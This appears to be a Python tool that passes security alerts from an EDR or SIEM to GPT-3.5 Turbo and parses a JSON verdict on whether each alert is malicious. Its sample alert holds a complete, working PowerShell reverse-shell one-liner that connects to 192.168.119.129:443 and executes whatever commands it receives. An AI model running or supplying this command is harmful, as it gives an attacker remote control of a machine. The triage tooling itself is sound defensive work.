import json
import logging
import os

import openai
from dotenv import load_dotenv

load_dotenv()
openai.api_key = os.getenv("OPENAI_API_KEY")

logging.basicConfig(level=logging.DEBUG)


class Alert:
    def __init__(self, user_role, process, alert, command):
        self.user_role = user_role
        self.process = process
        self.alert = alert
        self.command = command

    def __str__(self):
        return f"User Role: {self.user_role}\nProcess: {self.process}\nAlert: {self.alert}\nCommand:\n{self.command}"


class AlertAnalysis:
    def __init__(
        self,
        malicious: bool,
        recommendation: str,
        explanation: str,
        mitre_technique: str,
        confidence: int,
        threat_actor: str,
        next_steps: str,
        close_alarm: bool,
    ):
        self.malicious = malicious
        self.reccomendation = recommendation
        self.explanation = explanation
        self.mitre_technique = mitre_technique
        self.confidence = confidence
        self.threat_actor = threat_actor
        self.next_steps = next_steps
        self.close_alarm = close_alarm

    def __str__(self):
        return f"""Malicious: {self.malicious}\n
Recommendation: {self.reccomendation}\n
Explanation: {self.explanation}\n
Mitre Technique: {self.mitre_technique}\n
Confidence: {self.confidence}\n
Threat Actor: {self.threat_actor}\n
Next Steps: {self.next_steps}\n
Close Alarm: {self.close_alarm}
"""


def get_prompt(alert: Alert) -> str:
    """Given an alert, return the prompt to send to GPT3.5 Turbo"""

    return f"""
You are a helpful AI program who only speaks in json. You are reviewing an alert and must respond with only json.

{{
    "user_role" : {alert.user_role},
    "process" :{alert.process},
    "alert": {alert.alert},
    "command" : {alert.command}
}}

Example response:

{{
    "malicious": True,
    "recommendation" : "I have high confidence that this is a true positive and I recommend elevating this alert.",
    "explanation" : "The process 'calculator2.exe' is running from the users downloads directory and connecting to a known c2 host."
    "mitre_technique" : "T1055",
    "confidence" : 95,
    "threat_actor" : "APT17",
    "next_steps" : "The process calculator2.exe should be reviewed to understand where it was downloaded from, check the digital signature and validate that the host it is connecting to is indeed a known c2 host. If it is a known c2 host, then begin the incident response playbook by isolating the system and preventing further network traffic to the c2 host.",
    "close_alarm" : False
}}

json:
"""


def process_alert(alert: Alert) -> AlertAnalysis:
    """Given an alert, return the analysis of the alert"""

    logging.info(f"Alert name: {alert.alert}")
    logging.info(f"Alert process: {alert.process}")
    logging.info(f"Alert command: {alert.command}")
    logging.info(f"Alert user role: {alert.user_role}")

    prompt = get_prompt(alert)
    logging.info(f"Prompt: {prompt}")

    response = openai.ChatCompletion.create(
        model="gpt-3.5-turbo-16k",
        messages=[{"role": "system", "content": prompt}],
        max_tokens=7500,
        temperature=0.0,
        stop=None,
    )

    answer = response.choices[0].message.content
    alert_analysis = AlertAnalysis(**json.loads(answer))
    return alert_analysis


if __name__ == "__main__":

    # This is the data that would be passed in from your EDR/SIEM
    alert_data = {
        "user_role": "Global Admin",
        "process": "powershell.exe",
        "alert": "Reverse shell detected",
        "command": """powershell -c '$client = New-Object System.Net.Sockets.TCPClient('192.168.119.129',443);
    $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =
    ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    """,
    }

    # Represents an alert
    alert_instance = Alert(**alert_data)

    # Perform Analysis
    response = process_alert(alert_instance)

    logging.info(f"Alert Response:\n\n{response}")
